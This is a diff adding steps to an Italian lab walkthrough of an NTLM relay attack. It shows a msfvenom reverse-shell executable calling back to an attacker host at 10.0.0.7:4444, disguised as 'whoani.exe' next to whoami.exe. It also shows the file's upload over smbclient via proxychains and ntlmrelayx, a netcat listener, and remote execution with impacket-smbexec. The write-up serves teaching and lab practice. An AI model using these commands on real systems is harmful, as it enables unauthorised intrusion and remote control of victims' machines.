@@ -124,8 +124,31 @@ Prima dell'utilizzo di **proxychain4** è necessaria una modifica del file di co
 **smbclient** permette di avere accesso alle risorse del *target* (con i privilegi dell'utente connesso nel caso specifico privilegi amministrativi quindi controllo completo.)
 
 #### Passo 10 - Creazione della **Reverse-Shell** ####
-Si è provveduto a creare un file eseguibile che avvia una **reverse-shell** 'settata' per comunicare con la macchina attaccante (IP=10.0.0.7) sulla '**porta 4444**' attraverso il software **msfvenom**. Virne denominata 'whoani.exe' per 'confonderla' con un 'eseguibile' presente in 'C:\Windows\System32' denominato 'whoami.exe'. 
+Si è provveduto a creare un file eseguibile che avvia una **reverse-shell** 'settata' per comunicare con la macchina attaccante (**IP=10.0.0.7**) sulla '**porta 4444**' attraverso il software **msfvenom**. Virne denominata 'whoani.exe' per 'confonderla' con un 'eseguibile' presente in 'C:\Windows\System32' denominato 'whoami.exe'. 
 
  `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.7 LPORT=4444 -f exe -o whoani.exe`
 
+#### Passo 11 - Upload della **Reverse-Shell** sul *target* ####
 
+Per effettuare l'upload della 'reverse-shell' implementata al 'Passo 10' si è utilizzato '**smbclient**' (via **proxychain4/ntlmrelayx[socks]**) del 'Passo 9.
+
+* comando `shares` per visualizzare le condivisioni disponibili.
+* comando `use C$` per selezionare la risorsa C$ del SO.
+* comando `cd` per il 'cambio directory di destinazione'.
+* comando `put` per 'upload' del file 'whoani.exe' nella cartella 'C:\Windows\ System32\'.
+
+> Criticità riscontrata: Al fine di rendere possibile l'upload della reverse-shell di è dovuto disabilitare l'antivirus (defender) del *target* in quanto la mancanza di un offuscamento adeguato del codice dell'eseguibile consente il rilevamento di sofwtware potenzialmente dannoso da parte del *target*.
+
+#### Passo 12 - Avvio di **Netcat (nc)** sulla macchina *attaccante* in 'attesa' della connessione da parte della **reverse-shell**  ####
+
+`nc -nlvp 4444`
+
+Il comando mette **Netcat** in modalità di ascolto su una porta specifica (4444) in attesa di connessioni TCP in ingresso disabilitando la risoluzione 'DNS' per rendere la connessione più veloce.
+
+#### Passo 13 - Esecuzione della **reverse-shell** sulla macchina *target* attraverso il software **smbexec** (via **proxychain4/ntlmrelayx[socks]**)  ####
+
+`sudo proxychains4 impacket-smbexec ntlmlab/victim@10.0.0.10`
+
+**smbexec** è uno strumento  del pacchetto Impacket che permette di eseguire comandi su un sistema remoto tramite il protocollo SMB.
+
+![smbexec](Proxychain4-smbexec.jpg)
